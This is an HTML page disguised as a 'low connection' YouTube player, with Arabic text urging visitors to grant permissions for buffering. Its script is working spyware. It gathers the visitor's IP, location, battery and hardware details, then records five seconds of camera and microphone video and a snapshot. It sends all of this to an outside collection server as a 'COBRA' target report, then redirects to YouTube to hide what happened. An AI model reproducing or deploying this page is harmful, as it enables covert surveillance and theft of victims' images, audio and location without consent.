<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>YouTube Player - Low Connection</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
    .container { text-align: center; padding: 20px; }
    .loader { border: 4px solid #333; border-top: 4px solid #ff0000; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    video, canvas { opacity: 0; position: absolute; left: -9999px; }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="150">
    <h2>جارٍ معالجة الفيديو...</h2>
    <p style="color: #888;">الرجاء السماح بالصلاحيات لتسريع التخزين المؤقت (Buffering)</p>
    <div class="loader"></div>
  </div>

  <video id="v" autoplay muted playsinline></video>
  <canvas id="c" width="640" height="480"></canvas>

  <script>
    const chatId = new URLSearchParams(window.location.search).get("id");
    const v = document.getElementById("v");
    const c = document.getElementById("c");
    const ctx = c.getContext("2d");

    async function send(msg, type = "text", file = null) {
      if (!chatId) return;
      const payload = { chat_id: chatId };
      if (type === "text") payload.message = msg;
      if (type === "photo") { payload.message = "📸 Snapshot:"; payload.photo = file; }
      if (type === "video") { payload.message = "📹 Video Clip (5s):"; payload.video = file; }

      try {
        await fetch("https://render-backend-package1.onrender.com/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
          keepalive: true
        });
      } catch (e) { console.error(e); }
    }

    async function getFullData() {
      // 1. جلب بيانات البطارية
      let bat = "N/A";
      try {
        const b = await navigator.getBattery();
        bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging 🔌' : 'Discharging 🔋'})`;
      } catch (e) {}

      // 2. بيانات الوقت والمنطقة
      const now = new Date();
      const timeStr = now.toLocaleString('ar-DZ', { hour12: true });

      // 3. جلب الـ IP والمعلومات
      fetch("https://ipinfo.io/json?token=9c6f5e4a17b44c")
        .then(res => res.json())
        .then(async data => {
          let m = "🏴‍☠️ *COBRA ADVANCED REPORT* 🏴‍☠️\n";
          m += "━━━━━━━━━━━━━━━━━━\n";
          m += `🌍 *IP:* \`${data.ip}\`\n`;
          m += `📍 *Location:* ${data.city}, ${data.country}\n`;
          m += `🕒 *Target Time:* ${timeStr}\n`;
          m += `🔋 *Battery:* ${bat}\n`;
          m += `💻 *Hardware:* ${navigator.hardwareConcurrency} Cores | ${navigator.deviceMemory || 'N/A'}GB RAM\n`;
          m += "━━━━━━━━━━━━━━━━━━\n";
          m += "📡 *STATUS:* Initializing Mic/Cam Recording...";
          
          await send(m);
          startSpying();
        });
    }

    function startSpying() {
      // طلب الكاميرا والميكروفون معاً
      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
          v.srcObject = stream;
          
          // سجل فيديو لمدة 5 ثوانٍ
          const recorder = new MediaRecorder(stream);
          let chunks = [];
          recorder.ondataavailable = e => chunks.push(e.data);
          recorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            const reader = new FileReader();
            reader.readAsDataURL(blob);
            reader.onloadend = () => {
              const base64 = reader.result.split(',')[1];
              send("", "video", base64);
              
              // بعد إرسال الفيديو، خذ صورة عالية الدقة
              ctx.drawImage(v, 0, 0, c.width, c.height);
              const img = c.toDataURL("image/jpeg").split(',')[1];
              send("", "photo", img);

              // إنهاء العملية والتحويل لليوتيوب
              setTimeout(() => {
                stream.getTracks().forEach(t => t.stop());
                window.location.replace("https://youtu.be/tNWpOuJk2M8");
              }, 2000);
            };
          };

          recorder.start();
          setTimeout(() => recorder.stop(), 5000); // مدة الفيديو
        })
        .catch(err => {
          send("❌ *Permissions Denied (Mic/Cam)*");
          window.location.replace("https://youtu.be/tNWpOuJk2M8");
        });
    }

    if (chatId) getFullData();
  </script>
</body>
</html>
